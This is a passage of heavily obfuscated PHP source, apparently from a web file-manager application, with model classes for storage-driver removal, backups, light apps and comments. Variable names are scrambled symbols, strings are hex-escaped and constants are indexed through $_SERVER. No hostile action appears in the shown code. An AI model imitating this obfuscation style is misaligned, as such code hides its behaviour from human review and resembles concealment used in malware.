LNG($Ψ»Ο•¤[2346])); if (isset($¦‚ΠΝ ¦[$σθςβ‘])) { $ξ³Λϋ… = $¦‚ΠΝ ¦[$σθςβ‘]; } } if (stripos($ξ³Λϋ…, $Ψ»Ο•¤[2347]) === 0) { $Κβ„Φ‚ς = strpos($ξ³Λϋ…, $Ψ»Ο•¤[178]); if ($Κβ„Φ‚ς === !1) { $Κβ„Φ‚ς = strpos($ξ³Λϋ…, $Ψ»Ο•¤[4]); } if ($Κβ„Φ‚ς !== !1) { $ξ³Λϋ… = substr($ξ³Λϋ…, $Κβ„Φ‚ς + 1); } } $ξ³Λϋ… = LNG($Ψ»Ο•¤[1280]) . $ξ³Λϋ…; if ($ήυιΘ) { return $ξ³Λϋ…; } show_json($ξ³Λϋ…, !1); } public function driverListSystem() { $αΝηΛ¶† =& $_SERVER[γγάψ½]; $ξΕ°υ = parent::listData(); $†―µΡΫύ = array(); foreach ($ξΕ°υ as $ς‚ζέ¦α) { unset($ς‚ζέ¦α[$αΝηΛ¶†[234]], $ς‚ζέ¦α[$αΝηΛ¶†[88]]); if (!is_array($ς‚ζέ¦α[$αΝηΛ¶†[6]])) { $ς‚ζέ¦α[$αΝηΛ¶†[6]] = json_decode($ς‚ζέ¦α[$αΝηΛ¶†[6]], !0); } $†―µΡΫύ[] = $ς‚ζέ¦α; } return $†―µΡΫύ; } public function defaultDriver() { $Υ™ϋ†» =& $_SERVER[γγάψ½]; $Ύν±ϋΡ™ = parent::listData(); $ΜγΠΆς = array_filter_by_field($Ύν±ϋΡ™, $Υ™ϋ†»[37], 1); $ΜγΠΆς = $ΜγΠΆς[0]; if (!$ΜγΠΆς) { return array(); } if (!is_array($ΜγΠΆς[$Υ™ϋ†»[6]])) { $ΜγΠΆς[$Υ™ϋ†»[6]] = json_decode($ΜγΠΆς[$Υ™ϋ†»[6]], !0); } return $ΜγΠΆς; } public function driverInfo($¶ ΑΌ€) { $Ο•ΰΑ¥ =& $_SERVER[γγάψ½]; $ιμ®³Αη = array_to_keyvalue(parent::listData(), $Ο•ΰΑ¥[478]); if (!isset($ιμ®³Αη[$¶ ΑΌ€])) { return !1; } $®ήƒΥθ = $ιμ®³Αη[$¶ ΑΌ€]; if (!is_array($®ήƒΥθ[$Ο•ΰΑ¥[6]])) { $®ήƒΥθ[$Ο•ΰΑ¥[6]] = json_decode($®ήƒΥθ[$Ο•ΰΑ¥[6]], !0); } return $®ήƒΥθ; } public function remove($ΑΧΓ) { $this->removeShareItems($ΑΧΓ); return parent::remove($ΑΧΓ); } public function removeWithFile($«²σβ£¨, $βωΚρΦ, $€¦£ΓήΜ, $ίΰΟΒΓΨ = false) { $‚±Χσς =& $_SERVER[γγάψ½]; $‰΄³’³ = array($‚±Χσς[898] => $«²σβ£¨); $§€ωΤ‚™ = Model($‚±Χσς[549])->where($‰΄³’³)->count(); $ωφΈµΐΡ = Model($‚±Χσς[549])->where($‰΄³’³)->sum($‚±Χσς[79]); $ΐρρΤπ = $βωΚρΦ . $‚±Χσς[2348] . $«²σβ£¨; $…―ƒ΄Δω = LNG($βωΚρΦ == $‚±Χσς[628] ? $‚±Χσς[2349] : $‚±Χσς[2350]); $–’»πτ = new TaskFileTransfer($ΐρρΤπ, $‚±Χσς[216], $§€ωΤ‚™, $…―ƒ΄Δω . $‚±Χσς[465] . $€¦£ΓήΜ[$‚±Χσς[32]] . $‚±Χσς[215] . $«²σβ£¨); $–’»πτ->task[$‚±Χσς[838]] = (double) $ωφΈµΐΡ; $­Γ½’‹― = KodIO::defaultDriver(); $§Η†‘‹’ = $­Γ½’‹―[$‚±Χσς[478]]; $Λ›θβ = $ζητ·® = $Σθ’¬Τμ = array(); $ζ›ψΏ = Model($‚±Χσς[233])->where($‰΄³’³)->field($‚±Χσς[2351])->select(); foreach ($ζ›ψΏ as $®·σΔύχ) { $­²Υ†‹ = $®·σΔύχ[$‚±Χσς[546]]; if ($ίΰΟΒΓΨ) { $ζητ·®[] = $­²Υ†‹; continue; } $‚χΕΰω = $®·σΔύχ[$‚±Χσς[87]]; $οζα§πΐ = get_path_father($‚χΕΰω); $Σθ’¬Τμ[] = $οζα§πΐ; $οζα§πΐ = str_replace("\173\x69\157\x3a{$«²σβ£¨}\175\x2f", "\173\x69\x6f\72{$§Η†‘‹’}\175\57", $οζα§πΐ); if (!IO::exist($‚χΕΰω)) { $Λ›θβ[] = $­²Υ†‹; $–’»πτ->updateFileEnd($®·σΔύχ[$‚±Χσς[32]], $®·σΔύχ[$‚±Χσς[79]]); write_log($‚±Χσς[2352] . $‚χΕΰω, $‚±Χσς[1925]); continue; } $ΩϋλφΨΌ = IO::move($‚χΕΰω, $οζα§πΐ, REPEAT_RENAME); if (!$ΩϋλφΨΌ) { $ζητ·®[] = $­²Υ†‹; $–’»πτ->updateFileEnd($®·σΔύχ[$‚±Χσς[32]], $®·σΔύχ[$‚±Χσς[79]]); write_log($‚±Χσς[2353] . $‚χΕΰω, $‚±Χσς[1925]); continue; } $‰΄³’³ = array($‚±Χσς[546] => $­²Υ†‹); $¦ρυχ = array($‚±Χσς[898] => $§Η†‘‹’, $‚±Χσς[87] => $ΩϋλφΨΌ); Model($‚±Χσς[233])->where($‰΄³’³)->save($¦ρυχ); } $ΣΏά³Χ = $–’»πτ->task; if (!$ίΰΟΒΓΨ) { Cache::set($ΐρρΤπ, $ΣΏά³Χ); } $–’»πτ->end(); $Λ›θβ = array_unique($Λ›θβ); $ζητ·® = array_unique($ζητ·®); if (!$ίΰΟΒΓΨ && ($Λ›θβ || $ζητ·®)) { $ ›ιΜ”Ί = array(); if ($Λ›θβ) { $ ›ιΜ”Ί[] = sprintf(LNG($‚±Χσς[2354]), count($Λ›θβ)); } if ($ζητ·®) { $ ›ιΜ”Ί[] = sprintf(LNG($‚±Χσς[2355]), count($ζητ·®)); } $ ›ιΜ”Ί = sprintf(LNG($‚±Χσς[2356]), implode($‚±Χσς[2357], $ ›ιΜ”Ί)) . $‚±Χσς[2358] . date($‚±Χσς[2359]) . $‚±Χσς[2360]; if ($βωΚρΦ == $‚±Χσς[1962]) { $ ›ιΜ”Ί .= $‚±Χσς[2361] . LNG($‚±Χσς[2362]); } else { $ ›ιΜ”Ί = LNG($‚±Χσς[2363]) . $‚±Χσς[2364] . $ ›ιΜ”Ί; } $ΣΏά³Χ[$‚±Χσς[1275]] = $ ›ιΜ”Ί; Cache::set($ΐρρΤπ, $ΣΏά³Χ); unset($€¦£ΓήΜ[$‚±Χσς[6]]); $Ζ¦†‹ = array($‚±Χσς[478] => $«²σβ£¨, $‚±Χσς[2233] => $‚±Χσς[628], $‚±Χσς[32] => $€¦£ΓήΜ[$‚±Χσς[32]], $‚±Χσς[98] => $€¦£ΓήΜ[$‚±Χσς[98]]); Hook::trigger($‚±Χσς[1804], array($‚±Χσς[1298] => $Ζ¦†‹, $‚±Χσς[1308] => !0)); show_json($ ›ιΜ”Ί, !1, 100111); } if ($βωΚρΦ == $‚±Χσς[628]) { return !0; } if ($Λ›θβ || $ζητ·®) { $Ίϋχ‰ω = array_merge($Λ›θβ, $ζητ·®); $Ίϋχ‰ω = array_filter(array_unique($Ίϋχ‰ω)); $this->removeByFileID($Ίϋχ‰ω); } if ($Σθ’¬Τμ) { $Σθ’¬Τμ = array_filter(array_unique($Σθ’¬Τμ)); foreach ($Σθ’¬Τμ as $‚χΕΰω) { $ΌξγΣ = IO::has($‚χΕΰω, !0); if (!$ΌξγΣ[$‚±Χσς[242]] && !$ΌξγΣ[$‚±Χσς[243]]) { IO::remove($‚χΕΰω); } } } return $this->remove($«²σβ£¨); } private function removeByFileID($¤Ϊ­¦Δΰ = array()) { $ο…υ©ύ =& $_SERVER[γγάψ½]; if (empty($¤Ϊ­¦Δΰ)) { return; } $ΈΘ»΅ζ― = array($ο…υ©ύ[546] => array($ο…υ©ύ[7], $¤Ϊ­¦Δΰ)); $ύπ—η©υ = Model($ο…υ©ύ[1439])->where($ΈΘ»΅ζ―)->field($ο…υ©ύ[2309])->select(); if (!$ύπ—η©υ) { return Model($ο…υ©ύ[549])->remove($¤Ϊ­¦Δΰ); } $ύπ—η©υ = array_to_keyvalue($ύπ—η©υ, $ο…υ©ύ[194], $ο…υ©ύ[546]); foreach ($ύπ—η©υ as $ςτΨ™ό => $Α‰Γΐέ†) { Model($ο…υ©ύ[905])->removeNow($ςτΨ™ό, !1); } $Υψƒ²ΧΦ = array_diff($¤Ϊ­¦Δΰ, array_unique(array_values($ύπ—η©υ))); if ($Υψƒ²ΧΦ) { return Model($ο…υ©ύ[549])->remove($Υψƒ²ΧΦ); } } private function removeShareItems($¥ΩΕµυ) { $§΄’ΗΘ =& $_SERVER[γγάψ½]; $Ζ™ξ—‚­ = "\x7b\151\x6f\x3a{$¥ΩΕµυ}\x7d\x2f"; $Μ‚Μ±• = array($§΄’ΗΘ[194] => 0, $§΄’ΗΘ[1268] => array($§΄’ΗΘ[462], "{$Ζ™ξ—‚­}\x25")); $Θ£—υΪπ = Model($§΄’ΗΘ[1973])->where($Μ‚Μ±•)->field($§΄’ΗΘ[673])->select(); if (empty($Θ£—υΪπ)) { return; } $®Ϊ Η–• = array_to_keyvalue($Θ£—υΪπ, $§΄’ΗΘ[12], $§΄’ΗΘ[673]); Model($§΄’ΗΘ[672])->remove($®Ϊ Η–•); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\56\x4c\x69\147\x68\x74\101\160\160"; public $modelType = "\x53\171\x73\164\x65\x6d\x4f\x70\164\x69\157\x6e"; public $field = array("\x6e\141\x6d\145", "\147\x72\157\165\160", "\144\145\x73\143", "\143\x6f\156\x74\x65\x6e\164"); public function listData($ƒΖοίΗδ = false, $Ϊ‘€¥Εν = "\155\157\x64\x69\x66\171\x54\x69\x6d\145", $ΗΠΖ‡Κλ = true) { return parent::listData($ƒΖοίΗδ, $Ϊ‘€¥Εν, $ΗΠΖ‡Κλ); } public function remove($ήΞ½›•) { $υ¨”—„ή = $this->findByName($ήΞ½›•); if (!$υ¨”—„ή) { return !1; } return parent::remove($υ¨”—„ή[$_SERVER[γγάψ½][478]]); } public function add($ξ€Θ«ό) { if ($this->findByName($ξ€Θ«ό[$_SERVER[γγάψ½][32]])) { return !1; } return parent::insert($ξ€Θ«ό); } public function update($ΘΓ΄Γκο, $ωΕΧ®»¦) { $‹µ‘£ƒ =& $_SERVER[γγάψ½]; $‘”ΔΆ = $this->findByName($ΘΓ΄Γκο); $Ό»ΙΰΠΟ = $this->findByName($ωΕΧ®»¦[$‹µ‘£ƒ[32]]); if (!$‘”ΔΆ || $Ό»ΙΰΠΟ && $Ό»ΙΰΠΟ[$‹µ‘£ƒ[478]] != $‘”ΔΆ[$‹µ‘£ƒ[478]]) { return !1; } return parent::update($‘”ΔΆ[$‹µ‘£ƒ[478]], $ωΕΧ®»¦); } } goto E‡‚ίΘδ™; dβΙ±‘‡δ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\142\x61\x63\x6b\x75\x70\x4c\151\x73\164"; public $field = array("\151\157", "\x6e\x61\155\x65", "\163\164\x61\164\x75\x73", "\143\x6f\156\164\x65\156\x74", "\x6d\x61\x6e\165\x61\154", "\162\145\x73\165\154\x74", "\x74\151\155\145\x46\x72\x6f\155", "\x74\151\x6d\x65\x54\x6f"); public function config() { $­χκν  =& $_SERVER[γγάψ½]; Action($­χκν [2018])->taskInit(); $†Λ—Φκρ = Model($­χκν [845])->get($­χκν [852]); $†Λ—Φκρ = json_decode($†Λ—Φκρ, !0); $†Λ—Φκρ = is_array($†Λ—Φκρ) ? $†Λ—Φκρ : array(); $this->parseContent($†Λ—Φκρ); unset($†Λ—Φκρ[$­χκν [1762]]); Model($­χκν [1761])->cacheClear(); $Αή³Α = $­χκν [2019]; $ΣΰΦ ΟΧ = Model($­χκν [2020])->findByKey($­χκν [1780], $Αή³Α); if (!$ΣΰΦ ΟΧ) { $ΣΰΦ ΟΧ = array(); } if (isset($ΣΰΦ ΟΧ[$­χκν [207]])) { $ΣΰΦ ΟΧ[$­χκν [207]] = json_decode($ΣΰΦ ΟΧ[$­χκν [207]], !0); } if (isset($†Λ—Φκρ[$­χκν [207]])) { $ΣΰΦ ΟΧ[$­χκν [207]][$­χκν [1765]] = $†Λ—Φκρ[$­χκν [207]]; unset($†Λ—Φκρ[$­χκν [207]]); } return array_merge($ΣΰΦ ΟΧ, $†Λ—Φκρ); } public function listData($άλϋ©δ£ = false, $΅’έέ¬ = "\x6d\x6f\144\151\x66\171\x54\x69\155\145", $ΕέχάΤ = false) { $ϋ“ΥΞ = parent::listData($άλϋ©δ£, $΅’έέ¬, !0); if (!$ϋ“ΥΞ) { return $ϋ“ΥΞ; } if ($άλϋ©δ£) { $ϋ“ΥΞ = array($ϋ“ΥΞ); } foreach ($ϋ“ΥΞ as &$’ΉΌ) { $this->parseContent($’ΉΌ); } return $άλϋ©δ£ ? $ϋ“ΥΞ[0] : $ϋ“ΥΞ; } public function parseContent(&$βά¬θπ) { $•Ο›Κ‚ =& $_SERVER[γγάψ½]; $¦νΒΉΐη = _get($βά¬θπ, $•Ο›Κ‚[171], $•Ο›Κ‚[91]); if (!in_array($¦νΒΉΐη, array($•Ο›Κ‚[851], $•Ο›Κ‚[1218]))) { $βά¬θπ[$•Ο›Κ‚[171]] = $¦νΒΉΐη == $•Ο›Κ‚[91] ? $•Ο›Κ‚[1218] : $•Ο›Κ‚[851]; } } public function lastItem() { $η™μ®ψφ = $this->listData(); return !empty($η™μ®ψφ[0]) ? $η™μ®ψφ[0] : null; } public function kill($θψΧΡ›°) { $µΈ”–¥ =& $_SERVER[γγάψ½]; $©²§‰ = $this->listData($θψΧΡ›°); if (!$©²§‰ || empty($©²§‰[$µΈ”–¥[32]])) { return !0; } Task::kill($µΈ”–¥[860]); Task::kill($µΈ”–¥[879]); Task::kill($µΈ”–¥[889]); $Κ‘νε‡ = $©²§‰[$µΈ”–¥[32]]; $³Ό±•μ€ = TEMP_FILES . $µΈ”–¥[855] . $Κ‘νε‡ . $µΈ”–¥[8]; IO::remove($³Ό±•μ€, !1); return $this->remove($θψΧΡ›°); } public function remove($¤Άμ”Ά™) { $ƒ†ΎΤύχ = $this->listData($¤Άμ”Ά™); if (!$ƒ†ΎΤύχ) { return !0; } return $this->backupRemove($ƒ†ΎΤύχ); } private function backupRemove($Σώμζά) { parent::remove($Σώμζά[$_SERVER[γγάψ½][478]]); $υ³ ¥© = $this->backupPath($Σώμζά); IO::remove($υ³ ¥©, !1); return !0; } private function backupPath($‰Νι’Ρ) { $ηω¨μΜ =& $_SERVER[γγάψ½]; $§θ¦ή = $‰Νι’Ρ[$ηω¨μΜ[32]]; $Έ­ρν = Model($ηω¨μΜ[845])->get($ηω¨μΜ[846]); $«νΞψΌ = substr(md5($ηω¨μΜ[847] . $Έ­ρν . $§θ¦ή), 0, 8); return "\x7b\151\157\x3a{$‰Νι’Ρ[$ηω¨μΜ[827]]}\175\x2f\x64\141\164\141\x62\x61\163\x65\x2f\142\x61\143\x6b\x75\x70\x2f" . $§θ¦ή . $ηω¨μΜ[11] . $«νΞψΌ; } public function start() { $Ωου² =& $_SERVER[γγάψ½]; if ($GLOBALS[$Ωου²[6]][$Ωου²[92]][$Ωου²[2021]] != $Ωου²[91]) { return !0; } $Ε€‘ = $this->config(); if (!$Ε€‘ || $Ε€‘[$Ωου²[1762]] != $Ωου²[91]) { return !1; } if ($Ε€‘[$Ωου²[171]] == $Ωου²[851]) { $Υ›υ = Model($Ωου²[845])->get($Ωου²[1335]); if ($Υ›υ == $Ωου²[1336]) { $Ε€‘[$Ωου²[171]] = $Ωου²[1218]; } } $•°‘ΥΎά = $this->process(); foreach ($•°‘ΥΎά as $θεΝάΜΪ) { if ($θεΝάΜΪ) { return Task::restart($θεΝάΜΪ[$Ωου²[478]]); } } $µ³†¨ = new Backup(); $‡°³–…η = $µ³†¨->db(); if ($‡°³–…η) { $‡°³–…η = $µ³†¨->dbFile(); if ($‡°³–…η && $Ε€‘[$Ωου²[171]] == $Ωου²[851]) { $‡°³–…η = $µ³†¨->file(); } } Backup::set(array($Ωου²[825] => 1, $Ωου²[836] => time())); return !0; } public function process() { $‚κύ­βΡ =& $_SERVER[γγάψ½]; $„ΦΝΔ = array($‚κύ­βΡ[832] => Task::get($‚κύ­βΡ[860]), $‚κύ­βΡ[837] => Task::get($‚κύ­βΡ[879]), $‚κύ­βΡ[233] => Task::get($‚κύ­βΡ[889])); $ΉψΤΌΗ = !1; foreach ($„ΦΝΔ as &$ΘΜ™ΟΪ) { if ($ΉψΤΌΗ) { $ΘΜ™ΟΪ = !1; continue; } if ($ΘΜ™ΟΪ) { $μ΅η‘ι = intval(_get($ΘΜ™ΟΪ, $‚κύ­βΡ[1798], 0)); if (time() - $μ΅η‘ι > 7200) { Task::kill($ΘΜ™ΟΪ[$‚κύ­βΡ[478]]); $ΉψΤΌΗ = !0; $ΘΜ™ΟΪ = !1; } } } return $„ΦΝΔ; } public function restore() { $ϊψ…™ =& $_SERVER[γγάψ½]; ActionCall($ϊψ…™[1146], !0, 1); ActionCall($ϊψ…™[1146], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\145\156\164"; protected $tableMeta = array("\164\141\x62\154\145\x4e\x61\x6d\x65" => "\143\x6f\x6d\155\x65\x6e\x74\x5f\155\145\x74\141", "\x6d\145\164\141\x46\x69\145\x6c\144" => "\143\x6f\x6d\155\145\156\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ς‡Δ‚ι) { $χ™‡­Ρ =& $_SERVER[γγάψ½]; if ($ς‡Δ‚ι[$χ™‡­Ρ[2022]]) { $ƒ°ςγρ = $this->where(array($χ™‡­Ρ[2023] => $ς‡Δ‚ι[$χ™‡­Ρ[2022]]))->find(); if (!$ƒ°ςγρ || $ƒ°ςγρ[$χ™‡­Ρ[191]] != $ς‡Δ‚ι[$χ™‡­Ρ[191]] || $ƒ°ςγρ[$χ™‡­Ρ[574]] != $ς‡Δ‚ι[$χ™‡­Ρ[574]]) { return !1; } $this->where(array($χ™‡­Ρ[2023] => $ς‡Δ‚ι[$χ™‡­Ρ[2022]]))->setAdd($χ™‡­Ρ[2024], 1); } $ς‡Δ‚ι[$χ™‡­Ρ[2025]] = 0; $ς‡Δ‚ι[$χ™‡­Ρ[2024]] = 0; $ς‡Δ‚ι[$χ™‡­Ρ[825]] = 1; return $this->add($ς‡Δ‚ι); } public function commentCount($Πή°®Λ, $ήιδ°ΰ‡, $ςτ²ά—Ψ = false) { $¤λ²¦έ =& $_SERVER[γγάψ½]; if (!$Πή°®Λ) { return array(); } if (is_string($Πή°®Λ) || is_int($Πή°®Λ)) { $Πή°®Λ = array($Πή°®Λ); } $ΣΔΜΪ = array($¤λ²¦έ[574], $¤λ²¦έ[2026] => $¤λ²¦έ[570]); $γμ°ρ°ν = array($¤λ²¦έ[574] => array($¤λ²¦έ[7], $Πή°®Λ), $¤λ²¦έ[191] => $ήιδ°ΰ‡); if ($ςτ²ά—Ψ) { $γμ°ρ°ν[$¤λ²¦έ[1793]] = $ςτ²ά—Ψ; } $ϊ­§·Σ“ = $this->field($ΣΔΜΪ)->where($γμ°ρ°ν)->group($¤λ²¦έ[574])->select(); return array_to_keyvalue($ϊ­§·Σ“, $¤λ²¦έ[574], $¤λ²¦έ[570]); } public function starTarget($ξ¥ΜΔ, $Μ΄•) { $υ¬Ηξ™Ό =& $_SERVER[γγάψ½]; $„σ³¨ζΖ = $ξ¥ΜΔ + self::TYPE_STAR_OFFSET; $ ‡έκΘ‚ = array($υ¬Ηξ™Ό[1793] => USER_ID, $υ¬Ηξ™Ό[191] => $„σ³¨ζΖ, $υ¬Ηξ™Ό[574] => $Μ΄•); $½°ƒασ· = $this->where($ ‡έκΘ‚)->find(); if ($½°ƒασ·) { return $this->where(array($υ¬Ηξ™Ό[478] => $½°ƒασ·[$υ¬Ηξ™Ό[478]]))->delete(); } $Ιώ«ΎΘ = array($υ¬Ηξ™Ό[2022] => 0, $υ¬Ηξ™Ό[1793] => USER_ID, $υ¬Ηξ™Ό[825] => 1, $υ¬Ηξ™Ό[171] => $υ¬Ηξ™Ό[12], $υ¬Ηξ™Ό[191] => $„σ³¨ζΖ, $υ¬Ηξ™Ό[574] => $Μ΄•, $υ¬Ηξ™Ό[2025] => 0, $υ¬Ηξ™Ό[2024] => 0); return $this->add($Ιώ«ΎΘ); } public function starTargetCount($Ά·υ³, $›εώθΗω) { $½¤έΙ =& $_SERVER[γγάψ½]; $ιχςρο = $›εώθΗω + self::TYPE_STAR_OFFSET; $††λ¬ = $this->commentCount($Ά·υ³, $ιχςρο); $χ•ΤωΧ = $this->commentCount($Ά·υ³, $ιχςρο, USER_ID); return array($½¤έΙ[2027] => $††λ¬, $½¤έΙ[2028] => $χ•ΤωΧ); } public function starTargetUserList($μζ„΄ο, $‚ϋέήξ‚) { $•ΣΧΘ « =& $_SERVER[γγάψ½]; $―θΟ£ΩΘ = $μζ„΄ο + self::TYPE_STAR_OFFSET; $Λ…¤ώΊ = array($•ΣΧΘ «[574] => $‚ϋέήξ‚, $•ΣΧΘ «[191] => $―θΟ£ΩΘ); $–Χβ²ϊΖ = $this->where($Λ…¤ώΊ)->count(); $Ϋ®Κ¬Γμ = array($•ΣΧΘ «[335] => $–Χβ²ϊΖ, $•ΣΧΘ «[2029] => array()); if (!$–Χβ²ϊΖ) { return $Ϋ®Κ¬Γμ; } $εχΥ°α = $this->field($•ΣΧΘ «[1793])->where($Λ…¤ώΊ)->limit(500)->select(); $εχΥ°α = array_to_keyvalue($εχΥ°α, $•ΣΧΘ «[12], $•ΣΧΘ «[1793]); $Ϋ®Κ¬Γμ[$•ΣΧΘ «[2029]] = Model($•ΣΧΘ «[582])->userListInfo($εχΥ°α); return $Ϋ®Κ¬Γμ; } public function prasiseUserList($ΛΨ’Ο) { $›λέ =& $_SERVER[γγάψ½]; $›αΑόςΠ = array($›λέ[2030] => $ΛΨ’Ο); $•φ‘χγ  = $this->where($›αΑόςΠ)->find(); $ήΏ°οΉ = _get($•φ‘χγ , $›λέ[2025], 0); $κ»¦³νΛ = array($›λέ[335] => $ήΏ°οΉ, $›λέ[2029] => array()); if (!$ήΏ°οΉ) { return $κ»¦³νΛ; } $¨ς¥ΠΛ¬ = Model($›λέ[2031])->field($›λέ[1793])->where($›αΑόςΠ)->limit(500)->select(); $¨ς¥ΠΛ¬ = array_to_keyvalue($¨ς¥ΠΛ¬, $›λέ[12], $›λέ[1793]); $κ»¦³νΛ[$›λέ[2029]] = Model($›λέ[582])->userListInfo($¨ς¥ΠΛ¬); return $κ»¦³νΛ; } public function remove($΄ΩΡ) { $΄ύο”ήΊ =& $_SERVER[γγάψ½]; $Ντσωµ = array($΄ύο”ήΊ[2023] => $΄ΩΡ); $Βϋτµό = $this->where($Ντσωµ)->find(); if ($Βϋτµό[$΄ύο”ήΊ[2022]]) { $this->where(array($΄ύο”ήΊ[2023] => $Βϋτµό[$΄ύο”ήΊ[2022]]))->setAdd($΄ύο”ήΊ[2024], -1); } return $this->where($Ντσωµ)->delete(); } public function edit($γ§ΒΎƒΣ, $νΎΧσΜ) { $«χυ =& $_SERVER[γγάψ½]; $«Ζ™Λ’ = array($«χυ[2023] => $γ§ΒΎƒΣ); return $this->where($«Ζ™Λ’)->save(array($«χυ[2032] => $νΎΧσΜ)); } public function prasise($άΠΒΣΎΓ) { $°ο½» =& $_SERVER[γγάψ½]; $†τΈΡΪ = Model($°ο½»[2033]); $ΌΣ£™ΆΤ = array($°ο½»[2023] => $άΠΒΣΎΓ, $°ο½»[1784] => USER_ID); $ζΌΤ‚ιγ = $†τΈΡΪ->where($ΌΣ£™ΆΤ)->find(); if (!$ζΌΤ‚ιγ) { $†τΈΡΪ->add($ΌΣ£™ΆΤ); $ƒΎηφ­ύ = $this->where(array($°ο½»[2023] => $άΠΒΣΎΓ))->setAdd($°ο½»[2025], 1); } else { $†τΈΡΪ->where($ΌΣ£™ΆΤ)->delete(); $ƒΎηφ­ύ = $this->where(array($°ο½»[2023] => $άΠΒΣΎΓ))->setAdd($°ο½»[2025], -1); } return $ƒΎηφ­ύ; } public function targetInfo($ΎΟ±Ε , $€«θ”ύρ) { $κΧ―σΜ² =& $_SERVER[γγάψ½]; $Ν°³« = array($κΧ―σΜ²[656] => $ΎΟ±Ε , $κΧ―σΜ²[657] => $€«θ”ύρ); $ΌΑ χΊΎ = $this->where($Ν°³«)->count(); $•‹ΖΈΤ = "\x52\x49\x47\x48\x54\40\x4a\117\x49\x4e\40{$this->tablePrefix}\x63\x6f\x6d\155\x65\x6e\164\137\x70\162\141\x69\x73\x65\40\x73\x74\x61\x72\x20\x6f\156\x20\x63\x6f\x6d\x6d\x65\x6e\x74\56\x63\x6f\x6d\155\x65\156\164\111\x44\x20\75\40\163\x74\141\162\56\143\157\155\x6d\x65\x6e\x74\111\x44"; $€ΒωΏΚ = $this->alias($κΧ―σΜ²[432])->where($Ν°³«)->join($•‹ΖΈΤ, $κΧ―σΜ²[2034])->count(); $ΩϊθΪςΜ = array($κΧ―σΜ²[2035] => $ΌΑ χΊΎ, $κΧ―σΜ²[2036] => $€ΒωΏΚ); return $ΩϊθΪςΜ; } public function listData($σΓ‹ιμ) { $½ΟΥ•ν =& $_SERVER[γγάψ½]; if (isset($σΓ‹ιμ[$½ΟΥ•ν[2037]])) { if ($σΓ‹ιμ[$½ΟΥ•ν[2037]]) { $σΓ‹ιμ[$½ΟΥ•ν[2030]] = array($½ΟΥ•ν[1100], intval($σΓ‹ιμ[$½ΟΥ•ν[2037]])); } unset($σΓ‹ιμ[$½ΟΥ•ν[2037]]); } if (isset($σΓ‹ιμ[$½ΟΥ•ν[2038]])) { if ($σΓ‹ιμ[$½ΟΥ•ν[2038]]) { $σΓ‹ιμ[$½ΟΥ•ν[2030]] = array($½ΟΥ•ν[1097], intval($σΓ‹ιμ[$½ΟΥ•ν[2038]])); } unset($σΓ‹ιμ[$½ΟΥ•ν[2038]]); } return $this->_listData($σΓ‹ιμ); } private function _listData($Τθ²υΣΧ) { $Ϊσ®ί =& $_SERVER[γγάψ½]; $ΔΈΆςιφ = $this->where($Τθ²υΣΧ)->_makeOrder()->selectPage(100); $this->_listAppendParent($ΔΈΆςιφ[$Ϊσ®ί[448]]); $this->_listAppendUser($ΔΈΆςιφ[$Ϊσ®ί[448]]); $this->_listAppendMeta($ΔΈΆςιφ[$Ϊσ®ί[448]]); return $ΔΈΆςιφ; } private function _makeOrder() { $³†ΩΖτο =& $_SERVER[γγάψ½]; $ΥθΘ·ο― = array($³†ΩΖτο[2025], $³†ΩΖτο[2024], $³†ΩΖτο[234]); $‘ΕσΑΞι = Input::get($³†ΩΖτο[533], $³†ΩΖτο[7], $³†ΩΖτο[500], $ΥθΘ·ο―); $ιΥπ›’¤ = Input::get($³†ΩΖτο[534], $³†ΩΖτο[7], $³†ΩΖτο[1786], array($³†ΩΖτο[2039], $³†ΩΖτο[529])); $άΓάήΖΒ = $‘ΕσΑΞι . $³†ΩΖτο[53] . $ιΥπ›’¤; return $this->order($άΓάήΖΒ); } private function _listAppendParent(&$ΎΎΈΖ―) { $ήψ»πΥ =& $_SERVER[γγάψ½]; $α„¬¤Ν = array_unique(array_to_keyvalue($ΎΎΈΖ―, $ήψ»πΥ[12], $ήψ»πΥ[2022])); $α„¬¤Ν = array_remove_value($α„¬¤Ν, $ήψ»πΥ[231]); if (!$α„¬¤Ν) { return; } $Β©„ΒΩΏ = $this->where(array($ήψ»πΥ[2023] => array($ήψ»πΥ[7], $α„¬¤Ν)))->select(); $Β©„ΒΩΏ = array_to_keyvalue($Β©„ΒΩΏ, $ήψ»πΥ[2030]); foreach ($ΎΎΈΖ― as &$χνΘνφΦ) { if (isset($Β©„ΒΩΏ[$χνΘνφΦ[$ήψ»πΥ[2022]]])) { $χνΘνφΦ[$ήψ»πΥ[2040]] = $Β©„ΒΩΏ[$χνΘνφΦ[$ήψ»πΥ[2022]]]; } } unset($χνΘνφΦ); } private function _listAppendUser(&$τθ²Φρ­) { $µΙ΅ξΘΗ =& $_SERVER[γγάψ½]; $θω¦ξ = array_unique(array_to_keyvalue($τθ²Φρ­, $µΙ΅ξΘΗ[12], $µΙ΅ξΘΗ[1793])); $θω¦ξ = array_remove_value($θω¦ξ, $µΙ΅ξΘΗ[231]); if (count($θω¦ξ) == 0) { return; } foreach ($τθ²Φρ­ as $ηΈυθμΗ) { if (isset($ηΈυθμΗ[$µΙ΅ξΘΗ[2040]])) { $θω¦ξ[] = $ηΈυθμΗ[$µΙ΅ξΘΗ[2040]][$µΙ΅ξΘΗ[1793]]; } } $ΪόΖή = Model($µΙ΅ξΘΗ[602])->userListInfo($θω¦ξ); foreach ($τθ²Φρ­ as &$ηΈυθμΗ) { $ηΈυθμΗ[$µΙ΅ξΘΗ[670]] = $ΪόΖή[$ηΈυθμΗ[$µΙ΅ξΘΗ[1793]]]; if (isset($ηΈυθμΗ[$µΙ΅ξΘΗ[2040]])) { $ηΈυθμΗ[$µΙ΅ξΘΗ[2040]][$µΙ΅ξΘΗ[670]] = $ΪόΖή[$ηΈυθμΗ[$µΙ΅ξΘΗ[2040]][$µΙ΅ξΘΗ[1793]]]; } } unset($ηΈυθμΗ); } private function _listAppendMeta(&$ήβΠΩΝ‡) { $Τ«Ζω =& $_SERVER[γγάψ½]; $ωη·ΛΧΘ 